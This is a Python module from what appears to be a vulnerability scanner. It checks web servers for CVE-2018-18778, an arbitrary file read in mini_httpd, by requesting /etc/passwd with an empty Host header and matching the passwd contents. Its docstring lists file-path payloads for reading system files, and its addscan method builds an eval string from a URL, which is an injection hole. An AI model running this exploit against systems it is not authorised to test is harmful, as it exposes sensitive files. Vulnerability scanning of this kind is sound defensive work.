#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Mini_httpd是一个微型的Http服务器(约为Apache的90%) 广泛被各类IOT(路由器, 交换器, 摄像头等) 作为嵌入式服务器
    Mini_httpd扫描类: 
        mini_httpd 任意文件读取
            CVE-2018-18778
                Payload: https://vulhub.org/#/environments/mini_httpd/CVE-2018-18778/

file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests
from time import sleep

class MiniHttpd():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'mini_httpd'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2018_18778_payloads = [
            {
                'path': 'etc/passwd',
                'data': ''
            }
        ]

    def cve_2018_18778_scan(self, url):
        '''  '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'FileRead'
        vul_info['vul_id'] = 'CVE-2018-18778'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {
            'Host': ''
        }

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        for payload in self.cve_2018_18778_payloads:
            path = payload['path']
            target = url + path

            vul_info['path'] = path
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('/sbin/nologin' in res.text) 
                or ('root:x:0:0:root' in res.text) 
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2018_18778_scan, url=url)
        ]

minihttpd = MiniHttpd()
